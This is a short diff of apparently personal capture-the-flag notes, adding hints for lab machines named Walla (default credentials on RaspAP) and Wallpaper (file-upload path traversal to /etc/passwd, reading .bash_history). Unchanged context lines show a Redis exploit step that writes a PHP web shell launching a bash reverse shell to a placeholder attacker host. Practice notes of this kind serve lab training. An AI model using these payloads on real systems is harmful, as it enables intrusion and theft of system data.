@@ -25,6 +25,14 @@
 2. Exploit = https://www.exploit-db.com/exploits/44340 on /etc/redis/redis.conf 
 3. In redis-cli `set test '<?php system("echo \"bash -i >& /dev/tcp/{{LHOST}}/4444 0>&1\" | bash"); ?>'` 
 
+#### Walla => RaspAP (Web) 
+1. When unsure just google default creds! 
+
+#### Wallpaper => File upload LFI (Web) 
+1. LFI in file path ~ "../../../../../../../etc/passwd" 
+2. Discover .db by looking in .bash_history 
+3. Whack `ls -al` and '--help' on weird executables! 
+
 ---- 
 
 
